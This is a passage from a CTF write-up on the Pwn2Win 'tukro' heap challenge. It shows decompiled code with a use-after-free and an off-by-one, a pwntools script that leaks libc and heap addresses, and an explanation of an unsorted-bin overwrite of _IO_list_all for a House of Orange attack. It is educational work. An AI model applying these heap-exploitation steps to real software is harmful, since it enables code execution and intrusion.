</span><span>      v12 </span><span style=color:#f29668>= </span><span style=color:#f07178>atoi</span><span>(</span><span style=color:#f29668>&</span><span>buf)</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#ff7733>if </span><span>( v12 </span><span style=color:#f29668><= </span><span style=color:#f29718>0 </span><span style=color:#f29668>||</span><span> v12 </span><span style=color:#f29668>></span><span> v8 )
</span><span>      {
</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Not found"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>      }
</span><span>      </span><span style=color:#ff7733>else
</span><span>      {
</span><span>        </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"New Testimonial: "</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>buf)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f07178>memset</span><span>(v20</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x500</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span> v20</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x500</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        v6 </span><span style=color:#f29668>= *</span><span>v13[v12 </span><span style=color:#f29668>- </span><span style=color:#f29718>1</span><span>]</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f29668>*</span><span>v6 </span><span style=color:#f29668>= *</span><span>v20</span><span style=color:#bfbab0cc>;
</span><span>        v6[</span><span style=color:#f29718>159</span><span>] </span><span style=color:#f29668>=</span><span> v21</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#ffb454>qmemcpy</span><span>(
</span><span>          ((v6 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span>) </span><span style=color:#f29668>& </span><span style=color:#f29718>0xFFFFFFFFFFFFFFF8</span><span style=color:#ff7733>LL</span><span>)</span><span style=color:#bfbab0cc>,
</span><span>          (v20 </span><span style=color:#f29668>- </span><span>(v6 </span><span style=color:#f29668>- </span><span>((v6 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span>) </span><span style=color:#f29668>& </span><span style=color:#f29718>0xFFFFFFFFFFFFFFF8</span><span style=color:#ff7733>LL</span><span>)))</span><span style=color:#bfbab0cc>,
</span><span>          </span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>* </span><span>(((v6 </span><span style=color:#f29668>- </span><span>((v6 </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span>) </span><span style=color:#f29668>& </span><span style=color:#f29718>0xFFFFFFF8</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#f29718>1280</span><span>) </span><span style=color:#f29668>& </span><span style=color:#f29718>0xFFFFFFF8</span><span>) </span><span style=color:#f29668>>> </span><span style=color:#f29718>3</span><span>))</span><span style=color:#bfbab0cc>;
</span><span>      }
</span><span>    }
</span><span>  }
</span></code></pre><ul><li><em>Delete</em> -> <ol><li>Frees the chunk at requested idx without nulling out the pointer , hence we have <strong>Use After Free</strong>.<li>After freeing , it shifts all the testimonials and overwrites the data of the freed chunk.</ol></ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ff7733>if </span><span>( dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> a1] )
</span><span>  {
</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Testimonial Number: "</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>buf</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>8</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    v8 </span><span style=color:#f29668>= </span><span style=color:#f07178>atoi</span><span>(</span><span style=color:#f29668>&</span><span>buf)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if </span><span>( v8 </span><span style=color:#f29668><= </span><span style=color:#f29718>0 </span><span style=color:#f29668>||</span><span> v8 </span><span style=color:#f29668>></span><span> dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> a1] )
</span><span>    {
</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Not found"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=color:#ff7733>else if </span><span>( v8 </span><span style=color:#f29668>==</span><span> dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> a1] )
</span><span>    {
</span><span>      </span><span style=color:#f07178>free</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>unk_203068 </span><span style=color:#f29668>+ </span><span style=color:#f29718>25 </span><span style=color:#f29668>*</span><span> a1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>* </span><span>(</span><span style=color:#f29668>--</span><span>dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> a1] </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>)))</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>    </span><span style=color:#ff7733>else
</span><span>    {
</span><span>      v1 </span><span style=color:#f29668>= </span><span style=color:#f29718>16 </span><span style=color:#f29668>* </span><span>(v8 </span><span style=color:#f29668>- </span><span style=color:#f29718>1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#f29718>200</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> a1</span><span style=color:#bfbab0cc>;
</span><span>      v9 </span><span style=color:#f29668>= *</span><span>(</span><span style=color:#f29668>&</span><span>unk_203060 </span><span style=color:#f29668>+</span><span> v1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>      v10 </span><span style=color:#f29668>= *</span><span>(</span><span style=color:#f29668>&</span><span>unk_203060 </span><span style=color:#f29668>+</span><span> v1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>16</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#ff7733>for </span><span>( i </span><span style=color:#f29668>=</span><span> v8</span><span style=color:#bfbab0cc>;</span><span> i </span><span style=color:#f29668><=</span><span> dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> a1]</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>i )
</span><span>      {
</span><span>        v2 </span><span style=color:#f29668>= &</span><span>unk_203060 </span><span style=color:#f29668>+ </span><span style=color:#f29718>200 </span><span style=color:#f29668>*</span><span> a1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>16 </span><span style=color:#f29668>* </span><span>(i </span><span style=color:#f29668>- </span><span style=color:#f29718>1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        v3 </span><span style=color:#f29668>= &</span><span>unk_203060 </span><span style=color:#f29668>+ </span><span style=color:#f29718>200 </span><span style=color:#f29668>*</span><span> a1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>16 </span><span style=color:#f29668>* </span><span>(i </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        v4 </span><span style=color:#f29668>= *</span><span>(v3 </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f29668>*</span><span>(v2 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span>) </span><span style=color:#f29668>= *</span><span>(v3 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>        </span><span style=color:#f29668>*</span><span>(v2 </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>=</span><span> v4</span><span style=color:#bfbab0cc>;
</span><span>      }
</span><span>      v5 </span><span style=color:#f29668>= &</span><span>unk_203060 </span><span style=color:#f29668>+ </span><span style=color:#f29718>200 </span><span style=color:#f29668>*</span><span> a1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>16 </span><span style=color:#f29668>* </span><span>(</span><span style=color:#f29668>--</span><span>dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> a1] </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#f29668>*</span><span>(v5 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span>) </span><span style=color:#f29668>=</span><span> v9</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#f29668>*</span><span>(v5 </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>=</span><span> v10</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#f07178>free</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>&</span><span>unk_203068 </span><span style=color:#f29668>+ </span><span style=color:#f29718>25 </span><span style=color:#f29668>*</span><span> a1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>2 </span><span style=color:#f29668>* </span><span>(dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> a1] </span><span style=color:#f29668>+ </span><span style=color:#f29718>2</span><span style=color:#ff7733>LL</span><span>)))</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>  }
</span><span>  </span><span style=color:#ff7733>else
</span><span>  {
</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"You don't have a testimonial yet"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  }
</span></code></pre><p>Hey wait , doesn't this for loop look a little more fishy to you?<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>for </span><span>( i </span><span style=color:#f29668>=</span><span> v8</span><span style=color:#bfbab0cc>;</span><span> i </span><span style=color:#f29668><=</span><span> dword_203080[</span><span style=color:#f29718>50 </span><span style=color:#f29668>*</span><span> a1]</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>i )
</span><span>
</span></code></pre><p>The iterations happen for <em>dword_203080[50 * a1] + 1</em> times. Let's see how we can use this.<p>We have the bugs , heading on to exploit this.<h2 id=exploit-development-and-analysis>Exploit Development and Analysis</h2><p>Getting leaks shouldn't be a herculean task , so let's go with it without further blabbering.<p>First we allocate 3 users , sign in to first user and allocate 8 chunks into second user's bss space.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
</span><span style=color:#ff7733>import </span><span>sys
</span><span>
</span><span>libc </span><span style=color:#f29668>= </span><span style=color:#ffb454>ELF</span><span>(</span><span style=color:#c2d94c>"./libc.so.6"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>checksec</span><span style=color:#f29668>=</span><span style=color:#f29718>False</span><span>)
</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(</span><span style=color:#c2d94c>'tukro.pwn2.win'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>1337</span><span>)
</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace </span><span style=color:#f29668>= </span><span style=color:#f29718>True
</span><span style=color:#ff7733>else</span><span>:
</span><span>    io </span><span style=color:#f29668>= </span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>"./tukro"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>env </span><span style=color:#f29668>= </span><span>{</span><span style=color:#c2d94c>"LD_PRELOAD" </span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"./libc.so.6"</span><span>})
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>sign_up</span><span>(</span><span style=color:#f29718>user</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>passw</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Your choice: "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"1"</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Username: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(user))
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Password: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(passw))
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>sign_in</span><span>(</span><span style=color:#f29718>user</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>passw</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Your choice: "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"2"</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Username: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(user))
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Password: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(passw))
</span><span>
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>recp</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>test</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Your choice: "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"1"</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Recipient Username: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(recp))
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Testimonial: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(test))
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>my_test</span><span>():
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Your choice: "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"2"</span><span>)
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#f29718>choice</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>number</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>data</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Your choice: "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"3"</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(</span><span style=color:#c2d94c>"Edit Testimonial (y/N): "</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(choice)
</span><span>    </span><span style=color:#ff7733>if</span><span>(choice </span><span style=color:#f29668>== </span><span style=color:#c2d94c>"y"</span><span>):
</span><span>        io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Testimonial Number: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(number))
</span><span>        io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"New Testimonial: "</span><span style=color:#bfbab0cc>,</span><span>data)
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>delete</span><span>(</span><span style=color:#f29718>number</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Your choice: "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"4"</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Testimonial Number: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(number))
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>sign_out</span><span>():
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>"Your choice: "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"5"</span><span>)
</span><span>
</span><span>
</span><span style=color:#ff7733>if </span><span>__name__ </span><span style=color:#f29668>== </span><span style=color:#c2d94c>"__main__"</span><span>:
</span><span>    </span><span style=color:#ffb454>sign_up</span><span>(</span><span style=color:#c2d94c>"first_user"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"first_user"</span><span>)
</span><span>    </span><span style=color:#ffb454>sign_up</span><span>(</span><span style=color:#c2d94c>"second"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"second"</span><span>)
</span><span>    </span><span style=color:#ffb454>sign_up</span><span>(</span><span style=color:#c2d94c>"third"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"third"</span><span>)
</span><span>    </span><span style=color:#ffb454>sign_in</span><span>(</span><span style=color:#c2d94c>"first_user"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"first_user"</span><span>)
</span><span>    </span><span style=color:#ff7733>for </span><span>i </span><span style=color:#ff7733>in </span><span style=font-style:italic;color:#39bae6>xrange</span><span>(</span><span style=color:#f29718>8</span><span>):
</span><span>        </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#c2d94c>"second"</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(</span><span style=color:#f07178>chr</span><span>(</span><span style=color:#f07178>ord</span><span>(</span><span style=color:#c2d94c>'a'</span><span>) </span><span style=color:#f29668>+ </span><span>i))</span><span style=color:#f29668>*</span><span style=color:#f29718>4</span><span>)
</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
</span><span>
</span></code></pre><p>Now we <em>sign_in</em> from second user and delete first 3 chunks.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=color:#ffb454>sign_out</span><span>()
</span><span>    </span><span style=color:#ffb454>sign_in</span><span>(</span><span style=color:#c2d94c>"second"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"second"</span><span>)
</span><span>    </span><span style=color:#ffb454>delete</span><span>(</span><span style=color:#f29718>1</span><span>)
</span><span>    </span><span style=color:#ffb454>delete</span><span>(</span><span style=color:#f29718>2</span><span>)
</span><span>    </span><span style=color:#ffb454>delete</span><span>(</span><span style=color:#f29718>3</span><span>)
</span><span>    </span><span style=color:#ffb454>sign_out</span><span>()
</span><span>
</span></code></pre><p>Finally sign in from the first user and invoke the edit functionality which prints the contents of all testimonials of all users.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>    </span><span style=color:#ffb454>sign_in</span><span>(</span><span style=color:#c2d94c>"first_user"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"first_user"</span><span>)
</span><span>
</span><span>    </span><span style=font-style:italic;color:#5c6773>#Leaks
</span><span>    leaks </span><span style=color:#f29668>= </span><span style=color:#ffb454>edit</span><span>(</span><span style=color:#c2d94c>'N'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>""</span><span>)
</span><span>    string1 </span><span style=color:#f29668>= </span><span>leaks</span><span style=color:#f29668>.</span><span style=color:#ffb454>split</span><span>(</span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span>)[</span><span style=color:#f29668>-</span><span style=color:#f29718>2</span><span>]
</span><span>    string2 </span><span style=color:#f29668>= </span><span>leaks</span><span style=color:#f29668>.</span><span style=color:#ffb454>split</span><span>(</span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span>)[</span><span style=color:#f29668>-</span><span style=color:#f29718>5</span><span>]
</span><span>    libc_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(string1 </span><span style=color:#f29668>+</span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>"</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>)</span><span style=color:#f29668>- </span><span style=color:#f29718>0x3c4b78
</span><span>    heap_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(string2</span><span style=color:#f29668>+</span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>"</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0xa20
</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"Libc, Heap @ "</span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(libc_base) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>" : " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(heap_base))
</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
</span><span>
</span></code></pre><p>Now that we have the necessary leaks , and we can edit free chunks , the first idea that came into light was <strong>Unsorted Bin Attack</strong> by overwriting <strong>global_max_fast</strong> pointer in libc bss to make large sizes appear as fastbin sizes to malloc.<p>But there was an issue of size , it was fixed to 0x500 and for a successful attack with fastbin , we need to have this size somehow near a region like <strong>__malloc_hook</strong> or <strong>free_hook</strong> but we found none. We also tried with exit pointers in libc bss but with no luck.<p>Hence the only idea that was left worth trying was overwriting the <strong>IO_list_all</strong> pointer to invoke <strong>House Of Orange</strong> attack.<p>Let's have a look at the procedure in which we can trigger <strong>HOO</strong>.<ul><li><p>When malloc detects an error in the linked lists, like a corrupted fd and bk pointers, it aborts and calls a function <strong>_IO_flush_all_lockp</strong>.</p><li><p>This function is used to close all the file pointers such as stdout, stderr etc.</p><li><p>It does the same by using a global pointer called <strong>_IO_list_all</strong> that contains the pointer to the stdout/stderr file pointer.</p><li><p>The file pointer structures contain a pointer to the next file pointer. The function uses this to iteratively close all the file pointers used.</p><li><p>Now, these file pointers have jump tables that are used if some pre-conditions are met.</p><li><p>So, the idea is to overwrite the <strong>_IO_list_all</strong> pointer and point it to a location we control.</p></ul><p>We overwrite the <strong>\IO_list_all</strong> with a pointer to the main_arena.<ul><li><p>By correctly setting the size of the chunk in the free list, we can make sure that the next file pointer accessed will be the chunk in the free list.</p><li><p>So, in order to overwrite the <strong>_IO_list_all</strong> with a pointer to the main_arena, we use the unlink vulnerability.</p></ul><p>When a chunk in the free list is to be splitted off to service a malloc request, the code that gets executed is as follows<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ffb454>unsorted_chunks </span><span>(av)</span><span style=color:#f29668>-></span><span>bk </span><span style=color:#f29668>=</span><span> bck</span><span style=color:#bfbab0cc>;
</span><span>bck</span><span style=color:#f29668>-></span><span>fd </span><span style=color:#f29668>= </span><span style=color:#ffb454>unsorted_chunks </span><span>(av)</span><span style=color:#bfbab0cc>;
</span><span>
</span></code></pre><p>So, the fd pointer of previous chunk get’s overwritten with an address in the main_arena.<p>If we set the previous chunk to be <strong>_IO_list_all – 0x10</strong>, then <strong>bck->fd</strong> will be the <strong>_IO_list_all</strong> pointer.<p>In brief , all we need to do is<ol><li><p>Corrupt bck pointer of free chunk to point to <strong>_IO_list_all – 0x10</strong>.</p><li><p>Set size of chunk such that the second file pointer accessed is under users control. (<strong>0x61</strong> is one such value)</p></ol><p>So now the problem is we dont have control over size of the chunk we allocate , and hence in this case , we need to create overlapping chunks in such a way that we get control over size , fd and bk of a free chunk.<p>At this point , we have 3 chunks in free list , 2 of which are in unsorted bin.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>0000</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd150</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x564dacc41520 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa62626262 (</span><span style=color:#c2d94c>'bbbb\n'</span><span>)
</span><span style=color:#ffb454>0008</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd158</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0016</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd160</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x564dacc41f40 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa64646464 (</span><span style=color:#c2d94c>'dddd\n'</span><span>)
</span><span style=color:#ffb454>0024</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd168</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0032</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd170</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x564dacc42960 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa66666666 (</span><span style=color:#c2d94c>'ffff\n'</span><span>)
</span><span style=color:#ffb454>0040</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd178</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0048</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd180</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x564dacc42e70 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa67676767 (</span><span style=color:#c2d94c>'gggg\n'</span><span>)
</span><span style=color:#ffb454>0056</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd188</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0064</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd190</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x564dacc43380 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>xa68686868 (</span><span style=color:#c2d94c>'hhhh\n'</span><span>)
</span><span style=color:#ffb454>0072</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd198</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0080</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd1a0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x564dacc42450 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x564dacc41a20 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0  -</span><span style=color:#f29668>></span><span> This is in unsorted bin
</span><span style=color:#ffb454>0088</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd1a8</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x1 
</span><span style=color:#ffb454>0096</span><span style=color:#f29668>| </span><span style=color:#ffb454>0x564dac5fd1b0</span><span> --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x564dacc41a30 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x564dacc41000 --</span><span style=color:#f29668>> </span><span style=color:#f29718>0</span><span>x0  -</span><span style=color:#f29668>></span><span> we edit this chunk</span><span style=color:#c2d94c>'s fd to our fake chunk
</span><span style=color:#c2d94c>0104| 0x564dac5fd1b8 --> 0x1 
</span><span style=color:#c2d94c>0112| 0x564dac5fd1c0 --> 0x564dacc41010 --> 0x7f0e3ab4bb78 --> 0x564dacc43880 --> 0x0 -> This is also in unsorted bin
</span><span style=color:#c2d94c>0120| 0x564dac5fd1c8 --> 0x1 
</span><span style=color:#c2d94c>
